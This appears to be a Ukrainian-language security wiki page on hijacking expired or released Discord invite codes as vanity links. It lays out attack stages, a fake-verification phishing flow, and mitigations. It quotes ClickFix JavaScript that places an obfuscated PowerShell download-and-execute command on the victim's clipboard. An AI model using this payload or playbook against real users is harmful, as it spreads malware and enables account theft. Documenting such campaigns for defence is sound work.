# Hijacking Discord Invite

Discord invite hijacking використовує правила повторного використання custom vanity links: прострочений тимчасовий invite code або видалений постійний code, що складається лише з малих літер і цифр, може бути зареєстрований як vanity link на сервері з Level 3 Boost. Custom vanity link також може стати доступним, коли його початковий сервер втрачає Level 3 Boost; для тимчасового invite з великими літерами attacker може заздалегідь зареєструвати форму vanity у нижньому регістрі, поки звичайний invite залишається активним, але перенаправлення починається лише після завершення терміну дії цього invite.<sup>[[1]](#references)[[2]](#references)</sup>

## Типи Invite та ризик Hijack

Виявлений ризик відрізняється залежно від типу invite:<sup>[[1]](#references)[[2]](#references)</sup>

| Тип Invite           | Можливість Hijack? | Умова / Коментар                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Тимчасовий Invite Link | ✅          | Після завершення терміну дії code стає доступним і може бути повторно зареєстрований як vanity URL сервером із Boost. |
| Постійний Invite Link | ⚠️          | Якщо code видалено і він складається лише з малих літер і цифр, він може знову стати доступним.        |
| Custom Vanity Link    | ✅          | Якщо початковий сервер втрачає Level 3 Boost, його vanity invite стає доступним для нової реєстрації.    |

## Етапи Exploitation

1. Reconnaissance
- Відстежуйте публічні джерела (форум, соціальні мережі, Telegram-канали) у пошуках invite links, що відповідають шаблону `discord.gg/{code}` або `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Збирайте цікаві invite codes (тимчасові або vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Створіть або використайте наявний Discord server із привілеями Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- У **Server Settings → Vanity URL** спробуйте призначити цільовий invite code. Якщо його прийнято, code резервується malicious server.<sup>[[1]](#references)</sup>
3. Активація Hijack
- Для тимчасових invites дочекайтеся завершення терміну дії початкового invite (або видаліть його вручну, якщо контролюєте джерело).<sup>[[1]](#references)</sup>
- Для codes, що містять великі літери, варіант у нижньому регістрі можна захопити негайно, хоча перенаправлення активується лише після завершення терміну дії.<sup>[[1]](#references)</sup>
4. Тихе перенаправлення
- Користувачі, які переходять за старим link, безперешкодно потрапляють на server під контролем attacker, щойно hijack стає активним.<sup>[[1]](#references)</sup>

## Phishing Flow через Discord Server

1. Обмежте канали server так, щоб був видимим лише канал **#verify**.<sup>[[1]](#references)</sup>
2. Розгорніть bot (наприклад, **Safeguard#0786**), щоб він пропонував новим користувачам пройти verification через OAuth2.<sup>[[1]](#references)</sup>
3. Bot перенаправляє користувачів на phishing site (наприклад, `captchaguard.me`) під виглядом CAPTCHA або етапу verification.<sup>[[1]](#references)</sup>
4. Реалізуйте UX-трюк **ClickFix**:<sup>[[1]](#references)</sup>
- Відобразіть повідомлення про несправну CAPTCHA.
- Проведіть користувачів через відкриття діалогу **Win+R**, вставлення попередньо завантаженої PowerShell-команди та натискання Enter.

### Приклад ін'єкції в буфер обміну через ClickFix

У кампанії використовувався JavaScript для копіювання malicious PowerShell-команди в буфер обміну:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Цей підхід уникає прямого завантаження файлів і використовує знайомі елементи UI, щоб зменшити підозри користувачів.<sup>[[1]](#references)</sup>

## Mitigations

- Надавайте перевагу постійним invite links і переконайтеся, що код містить щонайменше одну велику літеру; видалені постійні коди, що містять великі літери, не можна повторно використовувати як vanity links.<sup>[[1]](#references)</sup>
- Регулярно змінюйте invite codes і відкликайте старі links.
- Відстежуйте статус boost Discord-сервера та використання vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Навчайте користувачів перевіряти автентичність сервера й уникати виконання команд, вставлених із clipboard.

## References

- [1] [Від довіри до загрози: викрадені Discord invites використовуються для багатоступеневої доставки malware](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – підтримка Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
